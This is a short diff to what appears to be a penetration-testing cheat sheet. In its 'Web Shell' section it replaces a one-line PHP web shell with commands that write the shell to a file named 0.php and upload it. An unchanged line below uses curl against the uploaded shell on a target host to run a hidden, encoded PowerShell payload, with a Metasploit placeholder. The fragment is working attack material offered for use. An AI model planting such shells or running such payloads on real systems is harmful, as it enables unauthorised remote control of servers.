@@ -189,7 +189,8 @@ unzip backup.zip -d .
 ## Web
 [*] Web Shell
 +---------- Initial Shell ----------+
-<?=`$_GET[cmd]`?>
+echo -n '<?=`$_GET[cmd]`?>' | tee 0.php
+Upload 0.php
 curl -G 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
 +---------- Variations ----------+
